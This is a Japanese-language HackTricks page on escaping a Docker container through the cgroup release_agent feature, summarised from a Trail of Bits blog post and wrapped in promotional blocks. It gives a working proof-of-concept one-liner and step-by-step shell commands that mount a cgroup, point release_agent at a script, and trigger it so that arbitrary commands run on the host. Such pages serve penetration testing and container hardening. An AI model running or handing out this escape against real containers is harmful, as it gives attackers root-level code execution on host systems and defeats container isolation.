# Docker release_agent cgroups escape

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) をフォローする。
* **ハッキングテクニックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) は、**ダークウェブ**を活用した検索エンジンで、企業やその顧客が**盗難マルウェア**によって**侵害**されていないかをチェックする**無料**機能を提供しています。

WhiteIntelの主な目標は、情報窃取マルウェアによるアカウント乗っ取りやランサムウェア攻撃に対抗することです。

彼らのウェブサイトをチェックし、**無料**でエンジンを試すことができます：

{% embed url="https://whiteintel.io" %}

***

**詳細については、** [**元のブログ投稿**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)** を参照してください。これは要約です：

オリジナル PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
証明のコンセプト（PoC）は、`release_agent`ファイルを作成し、その呼び出しをトリガーしてコンテナホストで任意のコマンドを実行する方法を示しています。以下は、関連する手順の概要です：

1. **環境の準備:**
* `/tmp/cgrp`ディレクトリを作成して、cgroupのマウントポイントとして使用します。
* RDMA cgroupコントローラをこのディレクトリにマウントします。RDMAコントローラが存在しない場合は、代替として`memory` cgroupコントローラを使用することが推奨されています。
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **子Cgroupの設定:**
* マウントされたCgroupディレクトリ内に名前が"x"の子Cgroupが作成されます。
* "x" Cgroupの通知を有効にするために、そのnotify\_on\_releaseファイルに1を書き込みます。
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **リリースエージェントの設定:**
* ホスト上のコンテナのパスは、/etc/mtab ファイルから取得されます。
* 次に、cgroupの release\_agent ファイルが取得したホストパスにある /cmd というスクリプトを実行するように設定されます。
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/cmdスクリプトの作成と設定:**
* /cmdスクリプトはコンテナ内で作成され、ps auxを実行し、出力をコンテナ内の/outputというファイルにリダイレクトするように設定されます。ホスト上の/outputのフルパスが指定されます。
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **攻撃のトリガー:**
* "x"の子cgroup内でプロセスが開始され、すぐに終了します。
* これにより`release_agent`（/cmdスクリプト）がトリガーされ、ホスト上でps auxを実行し、出力をコンテナ内の/outputに書き込みます。
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)は、**ダークウェブ**を活用した検索エンジンで、企業や顧客が**スティーラーマルウェア**によって**侵害**されていないかをチェックする**無料**の機能を提供しています。

WhiteIntelの主な目標は、情報窃取マルウェアによるアカウント乗っ取りやランサムウェア攻撃と戦うことです。

彼らのウェブサイトをチェックし、**無料**でエンジンを試すことができます：

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでのAWSハッキング**を学びましょう！</summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したり、PDF形式でHackTricksをダウンロードしたい場合は** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **をチェックしてください！**
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) **をフォローしてください。**
* **ハッキングトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリにPRを提出してください。**

</details>
